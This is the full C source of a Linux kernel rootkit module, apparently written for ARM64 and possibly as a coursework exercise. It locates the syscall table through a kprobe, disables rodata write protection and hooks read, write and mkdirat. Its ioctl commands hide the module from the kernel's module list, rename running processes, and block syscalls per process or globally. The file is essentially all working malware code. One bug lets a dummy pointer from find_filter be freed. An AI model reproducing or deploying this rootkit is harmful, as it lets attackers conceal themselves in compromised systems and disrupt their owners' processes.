#include "rootkit.h"

#include <asm/syscall.h>
#include <linux/cdev.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/reboot.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#define OURMODNAME "rootkit"
#define PAGE_KERNEL __pgprot(PROT_NORMAL)
#define PAGE_KERNEL_RO __pgprot((PROT_NORMAL & ~PTE_WRITE) | PTE_RDONLY)

// for kprobe
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
typedef unsigned long (*kallsyms_func)(const char *);
static kallsyms_func kallsyms_func_ptr;

// for modify the syscall table permision
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
// rodata segment
unsigned long start_rodata;
unsigned long init_begin;

// store original syscall handler with type sys_call_t
typedef asmlinkage long (*sys_call_t)(const struct pt_regs *);
static sys_call_t *sys_call_table_addr;
static sys_call_t original_write;
static sys_call_t original_read;
static sys_call_t original_mkdirat;

// construct a linked list to store the filter syscall
struct filter_entry {
    int syscall_nr;
    char comm[TASK_FILTER_LEN];
    struct list_head list;  // kernel 專用的鏈結串列
};

// for global linked list
struct global_filter_entry {
    int syscall_nr;
    struct list_head list;
};

static LIST_HEAD(filter_list);
static LIST_HEAD(global_filter_list);

static int is_syscall_globally_filtered(int syscall_nr) {
    struct global_filter_entry *entry;
    list_for_each_entry(entry, &global_filter_list, list) {
        if (entry->syscall_nr == syscall_nr)
            return 1;
    }
    return 0;
}

static struct filter_entry *find_filter(int syscall_nr, const char *comm) {
    if (is_syscall_globally_filtered(syscall_nr)) {
        return (void *)1;  // Dummy non-NULL value to indicate filter matched
    }

    struct filter_entry *entry;
    list_for_each_entry(entry, &filter_list, list) {
        if (entry->syscall_nr == syscall_nr && !strncmp(entry->comm, comm, TASK_FILTER_LEN))
            return entry; // 找到匹配的 filter，返回該 filter 資訊
    }

    return NULL;
}

// self-defined syscall hook
asmlinkage long hooked_write(const struct pt_regs *regs) {
    struct filter_entry *filter;
    filter = find_filter(__NR_write, current->comm);
    // printk(KERN_INFO "[rootkit] check process from %s\n", current->comm);
    
    if (filter) {
        printk(KERN_INFO "[rootkit] blocked write syscall from %s\n", current->comm);
        return -EPERM; 
    }

    // printk(KERN_INFO "[rootkit] original write\n");
    return original_write(regs);
}

asmlinkage long hooked_read(const struct pt_regs *regs) {
    struct filter_entry *filter;
    filter = find_filter(__NR_read, current->comm);
    // printk(KERN_INFO "[rootkit] check process from %s\n", current->comm);

    if (filter) {
        printk(KERN_INFO "[rootkit] blocked read syscall from %s\n", current->comm);
        return -EPERM;
    }

    // printk(KERN_INFO "[rootkit] original read\n");
    return original_read(regs);
}

asmlinkage long hooked_mkdirat(const struct pt_regs *regs) {
    struct filter_entry *filter;
    filter = find_filter(__NR_mkdirat, current->comm);
    // printk(KERN_INFO "[rootkit] check process from %s\n", current->comm);

    if (filter) {
        printk(KERN_INFO "[rootkit] blocked mkdirat syscall from %s\n", current->comm);
        return -EPERM;
    }

    // printk(KERN_INFO "[rootkit] original mkdir\n");
    return original_mkdirat(regs);
}

// init hook syscall
static unsigned long get_sys_call_table(void) {
    // register kprobe
    int ret;
    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("register_kprobe failed, returned %d\n", ret);
        return ret;
    }
    kallsyms_func_ptr = (kallsyms_func)kp.addr;
    unregister_kprobe(&kp);
    // get the address of update_mapping
    update_mapping_prot = (void *)kallsyms_func_ptr("update_mapping_prot");
    start_rodata = (unsigned long)kallsyms_func_ptr("__start_rodata");
    init_begin = (unsigned long)kallsyms_func_ptr("__init_begin");

    pr_info("Address of update_mapping_prot : %p\n", update_mapping_prot);
    pr_info("Address of start_rodata : %lu\n", start_rodata);
    pr_info("Address of init_begin : %lu\n", init_begin);

    return kallsyms_func_ptr("sys_call_table");
}

static int hook_syscall(void) {
    sys_call_table_addr = (sys_call_t *)get_sys_call_table();
    if (!update_mapping_prot || !start_rodata || !init_begin || !sys_call_table_addr) {
        pr_err("[rootkit] Invalid addresses detected, abort hooking.\n");
        return -EINVAL;
    }

    pr_info("address of syscall_table: %p\n", sys_call_table_addr);

    // 嘗試修改頁面權限，使用 try-catch-like 方式（內核無真正的try-catch，要檢查返回值）
    update_mapping_prot(__pa_symbol(start_rodata), start_rodata, init_begin - start_rodata, PAGE_KERNEL);

    if (!sys_call_table_addr[__NR_write] || !sys_call_table_addr[__NR_read] || !sys_call_table_addr[__NR_mkdirat]) {
        pr_err("[rootkit] Original syscall addresses invalid, restoring page protections.\n");
        update_mapping_prot(__pa_symbol(start_rodata), start_rodata, 
                            init_begin - start_rodata, PAGE_KERNEL_RO);
        return -EFAULT;
    }
    
    original_write = sys_call_table_addr[__NR_write];
    original_read = sys_call_table_addr[__NR_read];
    original_mkdirat = sys_call_table_addr[__NR_mkdirat];

    sys_call_table_addr[__NR_write] = hooked_write;
    sys_call_table_addr[__NR_read] = hooked_read;
    sys_call_table_addr[__NR_mkdirat] = hooked_mkdirat;

    update_mapping_prot(__pa_symbol(start_rodata), start_rodata, init_begin - start_rodata, PAGE_KERNEL_RO);
    pr_info("[rootkit] syscalls hooked successfully.\n");
    return 0;
}

static void unhook_syscall(void) {
    update_mapping_prot(__pa_symbol(start_rodata), start_rodata, init_begin - start_rodata, PAGE_KERNEL);

    sys_call_table_addr[__NR_write] = original_write;
    sys_call_table_addr[__NR_read] = original_read;
    sys_call_table_addr[__NR_mkdirat] = original_mkdirat;

    update_mapping_prot(__pa_symbol(start_rodata), start_rodata, init_begin - start_rodata, PAGE_KERNEL_RO);
}

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int rootkit_open(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

/* For IOCTL_MOD_HIDE */
static int hidden = 0; // check if module is hidden or not
static struct list_head *prev_module = NULL; // keep track of the original module location

static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg) {
    long ret = 0;
    struct filter_info info;
    struct filter_entry *new_filter, *existing_filter;

    printk(KERN_INFO "%s\n", __func__);

    switch (ioctl) {
    case IOCTL_MOD_HIDE:
        if (!hidden) {
            prev_module = THIS_MODULE->list.prev; // keep track of the previous module of the current module
            list_del(&THIS_MODULE->list); // remove from module list
            hidden = 1;
            printk(KERN_INFO "rootkit: Module hidden\n");
        } else {
            list_add(&THIS_MODULE->list, prev_module); // reinsert the module
            hidden = 0;
            printk(KERN_INFO "rootkit: Module unhidden\n");
        }
        break;

    case IOCTL_MOD_MASQ:
        {
            struct masq_proc_req req;
            struct masq_proc *proc_list;
            int i;

            // copy data from user space to kernel space
            if (copy_from_user(&req, (void __user *)arg, sizeof(struct masq_proc_req))) {
                ret = -EFAULT;
                break;
            }

            // Allocate memory for the list of processes
            proc_list = kmalloc(sizeof(struct masq_proc) * req.len, GFP_KERNEL);
            if (!proc_list) {
                ret = -ENOMEM;
                break;
            }

            // copy the list of masq_proc from user space
            if (copy_from_user(proc_list, req.list, sizeof(struct masq_proc) * req.len)) {
                kfree(proc_list);
                ret = -EFAULT;
                break;
            }

            // Iterate through each entity in the list and masquerade process names
            for (i = 0; i < req.len; i++) {
                struct masq_proc *proc = &proc_list[i];
                struct task_struct *task; // defined in linux/sched.h
                int found = 0;

                // Iterate through all tasks (processes)
                for_each_process(task) {
                    // check if task name matches orig_name
                    if (strncmp(task->comm, proc->orig_name, MASQ_LEN) == 0) {
                        // if the new name is shorter than the origin, masquerade it
                        // if (strlen(proc->new_name) < strlen(proc->orig_name))
                        if (strlen(proc->new_name) < 16) {
                            // strncpy(task->comm, proc->new_name, 16 '''sizeof(task->comm) - 1''');
                            strncpy(task->comm, proc->new_name, 16);
                            // Make sure there is a null terminator at the end
                            task->comm[sizeof(task->comm) - 1] = '\0';  
                            found = 1;
                            printk(KERN_INFO "rootkit: Masqueraded process %s -> %s", proc->orig_name, proc->new_name);
                        }
                        break;
                    }
                }

                if (!found) {
                    printk(KERN_WARNING "rootkit: Process %s not found for masquerading\n", proc->orig_name);
                }
            }

            // free allocated memory for process list
            kfree(proc_list);
        }
        break;

    case IOCTL_ADD_FILTER: {
        if (copy_from_user(&info, (void __user *)arg, sizeof(info))) {
            printk(KERN_INFO "add filter: copy_from_user failed\n");
            return -EFAULT;
        }

        if (info.comm[0] == '\0') {
            struct global_filter_entry *new_global = kmalloc(sizeof(*new_global), GFP_KERNEL);
            if (!new_global) return -ENOMEM;
    
            new_global->syscall_nr = info.syscall_nr;
            INIT_LIST_HEAD(&new_global->list);
            list_add(&new_global->list, &global_filter_list);
            printk(KERN_INFO "[rootkit] Added global filter: syscall %d (all processes)\n", info.syscall_nr);
            break;
        }
    
        new_filter = kmalloc(sizeof(*new_filter), GFP_KERNEL);
        if (!new_filter) {
            printk(KERN_INFO "[rootkit] kmalloc failed\n");
            return -ENOMEM;
        }

        new_filter->syscall_nr = info.syscall_nr;
        strncpy(new_filter->comm, info.comm, TASK_FILTER_LEN-1);
        new_filter->comm[TASK_FILTER_LEN-1] = '\0';

        INIT_LIST_HEAD(&new_filter->list);
        // filter list is global variable
        list_add(&new_filter->list, &filter_list);

        printk(KERN_INFO "[rootkit] Added filter: syscall %d, proc %s\n", info.syscall_nr, info.comm);
    
        break;
    }

    case IOCTL_REMOVE_FILTER:
        if (copy_from_user(&info, (void __user *)arg, sizeof(info))) {
            pr_info("remove filter: copy_from_user failed\n");
            return -EFAULT;
        }
        
        if (info.comm[0] == '\0') {
            struct global_filter_entry *entry, *tmp;
            list_for_each_entry_safe(entry, tmp, &global_filter_list, list) {
                if (entry->syscall_nr == info.syscall_nr) {
                    list_del(&entry->list);
                    kfree(entry);
                    printk(KERN_INFO "[rootkit] Removed global filter: syscall %d (all processes)\n", info.syscall_nr);
                    break;
                }
            }
            break;
        }

        existing_filter = find_filter(info.syscall_nr, info.comm);
        if (existing_filter) {
            list_del(&existing_filter->list);
            kfree(existing_filter);
            printk(KERN_INFO "[rootkit] Removed filter: syscall %d, proc %s\n", info.syscall_nr, info.comm);
        } else {
            printk(KERN_INFO "[rootkit] Filter not found: syscall %d, proc %s\n",
                info.syscall_nr, info.comm);
            ret = -ENOENT;
        }
        break;

    default:
        printk(KERN_ERR "[rootkit] unknown ioctl command (%u)\n", ioctl);
        ret = -EINVAL;
    }

    return ret;
}

static int major;
static struct class *cls;
int ret;

struct file_operations fops = {
    open : rootkit_open,
    unlocked_ioctl : rootkit_ioctl,
    release : rootkit_release,
    owner : THIS_MODULE
};

static int __init rootkit_init(void) {
    major = register_chrdev(0, OURMODNAME, &fops);
    if (major < 0) {
        pr_err("Registering char device failed with %d\n", major);
        return major;
    }

    pr_info("The module was assigned major number %d.\n", major);
    cls = class_create(THIS_MODULE, OURMODNAME);
    device_create(cls, NULL, MKDEV(major, 0), NULL, OURMODNAME);
    pr_info("Device created on /dev/%s\n", OURMODNAME);
    
    ret = hook_syscall();
    if (ret < 0) {
        pr_err("[rootkit] Failed to hook syscalls, unloading module\n");
        device_destroy(cls, MKDEV(major, 0));
        class_destroy(cls);
        unregister_chrdev(major, OURMODNAME);
        return ret;  // 如果失敗，及時回復並退出
    }

    printk(KERN_INFO "[rootkit] module loaded and syscall hooked.\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    // TODO: unhook syscall and cleanup syscall filter list
    unhook_syscall();
    printk(KERN_INFO "syscall restored.\n");

    pr_info("%s: removed\n", OURMODNAME);
    device_destroy(cls, MKDEV(major, 0));
    class_destroy(cls);
    unregister_chrdev(major, OURMODNAME);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
